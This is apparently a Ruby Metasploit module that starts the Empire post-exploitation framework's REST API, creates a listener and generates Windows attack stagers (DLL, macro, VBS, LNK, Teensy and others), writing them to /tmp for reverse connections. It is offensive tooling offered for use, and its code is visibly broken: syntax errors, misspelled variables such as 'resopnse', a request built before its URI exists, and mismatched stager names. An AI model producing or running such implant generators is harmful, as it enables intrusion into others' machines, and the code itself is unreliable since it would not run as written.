# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see theMetasploit
# web site for more information on licensing and terms of use.
# http://metasploit.com/
require 'msf/core/module/data_store.rb'
require 'msf/core/module/options'
require 'net/http'
require 'uri'
require 'json'
require 'openssl'

module MetasploitModule


	include Msf::Module::Options 
	include Msf::Module::DataStore
	def initialize
		super(
              'Name'       => 'Empire Stager Module',
              'Description'=> 'This creates a standalone stager for Empire using the Rest-API',
              'Author'     => ['author_name'],
              'License'    => MSF_LICENSE,-
              'Platform'   => ['Windows', 'Linux', 'MacOS']
             # 'Handler'    => Msf::Handler::EmpireShimHandler
              )
		register_options(
			[   OptAddress.new(
				'LHOST','The local address to listen on', required : true, default : 127.0.0.1),
			    OptPort.new(
					'LPORT', 'The local port to listen on', required : true, default : 8080),
		            OptString.new(
					'ListenerName', 'The empire listener name that would listen for the created stager on the local system', required : true ),
		            OptString.new(
					'USERNAME','The empire username you want to use for this session', required : true, default : 'empire_user'),
                            OptString.new(
					'PASSWORD', 'The empire password you want for this session', required : true, deafult : 'empire_pass'),
                            OptEnum.new(
					'StagerType', 'The type of stager to be generated', required : true, enums : ['windows/dll', 'windows/ducky', 'windows/launcher_sct', 'windows/laucher_vbs', 'windows/launcher_xml', 'windows/teensy', 'windows/launcher_bat', 'windows/launcher_lnk', 'windows/macro' ] ),
			    OptString.new(
					'PathToEmpire', 'The complete path to Empire-WEB API', required : true, default : '/')
            ])
    end
    def payload_name(stager)
    	@rand_no = rand(1..10000)
    	case stager
    	when "windows/dll"
    		return "/tmp/launcher#{@rand_no}.dll"
    	when "windows/launcher_bat"
    		return "/tmp/launcher#{@rand_no}.bat"
    	when "windows/launcher_vbs"
    		return "/tmp/launcher#{@rand_no}.vbs"
    	when "windows/launcher_sct"
    		return "/tmp/launcher#{@rand_no}.sct"
    	when "windows/launcher_lnk"
    		return "/tmp/launcher#{@rand_no}.lnk"
    	when "windows/launcher_xml"
    	        return "/tmp/launcher#{@rand_no}.xml"
    	when "windows/teensy"
                return "/tmp/launcher#{@rand_no}.ino"
    	when "windows/macro"
    		return "/tmp/macro#{@rand_no}.txt"
        when "multi/pyinstaller"
        	return "/tmp/launcher#{@rand_no}.elf"
        when "multi/war"
        	return "/tmp/launcher#{@rand_no}.war"
        end
    end

    def exploit
    	#
    	#Storing data from user
    	#
    	port = datastore['LPORT'].to_s
    	user_name = datastore['USERNAME'].to_s
    	user_pass = datastore['PASSWORD'].to_s
    	listener_name = datastore['ListenerName'].to_s
    	stager_type = datastore['StagerType'].to_s
	path = datastore['PathToEmpire'].to_s
    	command = "cd #{path}  && ./empire --headless " "--username \"" + user_name +"\" --password \"" + user_pass + "\" > /dev/null"
       	#
    	#Initiating the Empire API Instance thread with provided username and password
        #
        print_status("Initiating Empire Web-API")
        server = Thread.new{
        	value = system(command)
        }
        #
        #Creating the net::HTTP object
        #
        request = Net::HTTP::Post.new(uri)
        request.content_type = "application/json"
        #
        #Retrieving the active session token
        #
        sleep(25)
        uri = URI.parse("https://localhost:1337/api/admin/login")
        request.body = JSON.dump({
        	  "username" => user_name,
                  "password" => user_pass
        })
        req_options = {
               use_ssl: uri.scheme == "https",
               verify_mode: OpenSSL::SSL::VERIFY_NONE,
        }
        response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
               http.request(request)
        end
        if response.code == 200
        	print_status("Grabbing current session token")
        	sv1 = JSON.parse(response.body)
            token = sv1['token'].to_s
        elsif response.code == 401
        	print_error("Unable to grab session token")
        end
        #    
        #Creating the listener with provided name and port
        #
        uri = URI.parse("https://localhost:1337/api/listeners/http?token=#{token}")
        request.body = JSON.dump({
               "Name" => listener_name,
               "Port" => port
        })
        response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
               http.request(request)
        end
        if response.body.to_s.include?("error")
        	print_error("Failed to bind to localhost:#{port}, port likely already in use")
        elsif resopnse.body.to_s.include?("success")
        	print_status("Listener #{listener_name} started at localhost:#{port}")
        end
        #
        #Passing the create stager command
        #Querying Empire to output stager through the response as "Outfile" parameter doesn't seem to work as of now
        #
        uri = URI.parse("https://localhost:1337/api/stagers?token=#{token}")
        request.body = JSON.dump({
               "StagerName" => stager_type,
               "Listener" => listener_name,
               "OutFile" => ""
        })
        response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
               http.request(request)
        end
        #
        #Writing the output payload to the stager file at /tmp/ with a randomly created name
        #
        if response.code == 404
        	print_error("Invalid stager name")
        elsif resonse.code == 200
        	print_status("Generating Payload")
        	sv1 = JSON.parse(response.body)
            payload = payload_name(stager_type)
            f = File.open(payload, "w")
            f.puts sv1[stager_type]['Output']
            f.close
        	print_status("Payload successfully created at #{payload}")
        end
        #
        #Terminating the Rest-API and displaying the Listener name for future use.
        #
        uri = URI.parse("https://localhost:1337/api/admin/shutdown?#{token}")
        request_shutdown = Net::HTTP::Get.new(uri)
        response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
            http.request(request_shutdown)
        end
        #
        #Showing user the respective listener to use while for handling reverse connection
        #
        print_status("Use Listener:#{listener_name} to listen for the created stager")
        #
        #Terminating the thread
        #
        server.terminate 
    end
end
